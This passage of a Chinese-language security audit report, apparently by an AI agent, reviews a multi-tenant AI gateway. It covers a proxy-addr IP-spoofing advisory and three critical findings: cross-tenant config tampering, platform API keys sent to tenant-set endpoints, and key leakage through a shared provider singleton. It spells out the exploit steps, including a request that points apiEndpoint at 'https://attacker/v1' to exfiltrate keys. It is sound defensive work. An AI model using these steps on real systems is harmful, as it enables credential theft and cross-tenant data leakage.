### 1.1 依赖漏洞：critical 那条正好打在信任边界上

```
critical  proxy-addr  IP spoofing via IPv4-mapped IPv6 trust subnet
high      axios  ×6（SSRF / 原型污染 / ReDoS / DoS / HTTP2 旁路 / 重定向）
high      multer ×3（DoS / fd 泄漏）
moderate  axios  ×5, multer ×1, sprintf-js ×1
low       multer ×1
```

- `axios` 是**直接依赖**（`package.json:32`，装的是 `1.19.0`）。
- `proxy-addr` 是 Express 的传递依赖，而本项目**显式依赖它的语义**：`src/main.ts:38` `app.set('trust proxy', 'loopback')`，并在注释里写明用途是"防止客户端伪造 X-Forwarded-For 污染限流与审计日志"。该 critical 通告正是 `trust proxy` 的子网判定被 IPv4-mapped IPv6 绕过 ⇒ **限流按 IP 计数与审计日志来源 IP 可能被伪造**。是否可利用取决于部署（服务是否只监听回环、nginx 是否前置），但这是本项目**唯一"代码假设"直接命中"公告内容"**的一条，应优先升级。

## 二、🔴 P0：多租户越权与凭证外泄

> 以下三条均已由我**亲自读码复验**（含决定性前提），非仅转述子代理结论。

### P0-1 平台级外部模型库：任一租户管理员可改，并可取走已存密钥

| 项 | 内容 |
|---|---|
| 位置 | `src/gateway/external-model.controller.ts:38-39`；`src/tenant/external-model.service.ts`（全文无 `tenantId`） |
| 触发 | 任一租户的 4 类管理角色：`PUT /api/admin/ai-config/external-models/:id` 把 `providerBaseUrl` 改成自己的地址 → `POST /api/admin/ai-config/external-models/test/:id` |
| 证据 | 控制器全文 87 行**只挂 `@UseGuards(AdminGuard)`**，无任何 `getAdminIdentity` 调用（`:38-39`）。而 `AdminGuard` 明确同时放行**商家 4 角色**与平台身份：`admin-auth.guard.ts:33-38`（`MERCHANT_ADMIN_ROLES`）+ `:123-136`（`attachIdentity(req,'merchant',…)`）。`external-model.service.ts` 对 `tenantId` 的 grep **零命中**，`list/create/update/remove/testById` 全部无租户域 |
| 对照 | 隔壁 `ai-config.controller.ts:59-70` 有 `requirePlatformIdentity()`，`:53-57` 注释还专门记录了同类 P0 的修复。**修了一个控制器，漏了隔壁这个** |

**影响**：平台级模型配置被任意租户改写（影响所有租户的对话路由），且 `test/:id` 会解密已存密钥并出站请求 ⇒ 密钥被送到攻击者端点。

### P0-2 平台密钥 + 租户可控 baseUrl ⇒ 平台凭证外发

| 项 | 内容 |
|---|---|
| 位置 | `src/tenant/ai-config.service.ts:151-166` |
| 触发 | 租户管理员 `PUT /api/admin/ai-config/tenants/{自己租户}`，body 只给 `{apiEndpoint:"https://attacker/v1"}`（不传 apiKey），随后发一次对话 |
| 证据 | `const apiKey = this.crypto.decryptSafe(tenantConfig.apiKey) ?? this.crypto.decryptSafe(platformConfig.defaultApiKey) ?? '';`（`:151-154`）——**密钥缺失时回落到平台默认密钥**；同一返回体里 `baseUrl: tenantConfig.apiEndpoint ?? undefined,`（`:166`）——**端点取自租户自己写的字段** |
| 决定性前提（我逐个确认） | ① `PUT tenants/:tenantId` 对商家身份**放行本租户**：`ai-config.controller.ts:159-167` + `requireTenantAccess`（`:76-89`）；② 租户 DTO **确实接受 `apiEndpoint`**：`src/gateway/dto/ai-config.dto.ts:82-84` 在 `UpdateTenantAiConfigDto` 内 |

**结论**：密钥来源与端点来源**没有绑定关系**。要么"用平台密钥就必须钉死平台端点"，要么"租户自定义端点就必须用租户自己的密钥"。当前实现两者都放——平台密钥会被发往租户指定地址。

### P0-3 Provider 全局单例 + 就地 `configure()` ⇒ 跨租户密钥/端点串用

| 项 | 内容 |
|---|---|
| 位置 | `src/providers/provider-factory.ts:19-20, 68-81`；`src/brain/router/provider-router.service.ts:112, 137, 171`；`src/providers/deepseek.provider.ts:172-182` |
| 触发 | 租户 A 正常配置并对话后，租户 B 发 `{"model":"deepseek"}`（走 router 路径 1） |
| 证据 | 工厂自带认领注释：`当前阶段（R70-03）所有调用方共享单例，configure() 会切换全局配置`（`provider-factory.ts:19`）。`create()` 命中同一实例后 `if (config) provider.configure(config)`（`:77-79`）**就地改写**；`configure()` 用 `config.apiKey \|\| this.config.apiKey`、`config.baseUrl ?? this.config.baseUrl`（`deepseek.provider.ts:174-175`）⇒ 配置**粘滞**，不会因"本次没传"而复位。而 `provider-router.service.ts:112` `this.factory.create(requested)`、`:137` `create('glm')`、`:171` `create(fb)` **都不传 config** |

**影响**：B 的对话内容可能被发往 A 的端点、携带 A 的密钥。这是**跨租户数据泄漏**，而非仅配额问题。注意 `route()` 路径 2（`:119-122`）是传 config 的，所以问题集中在"用户指定模型"与"降级兜底"两条路径。
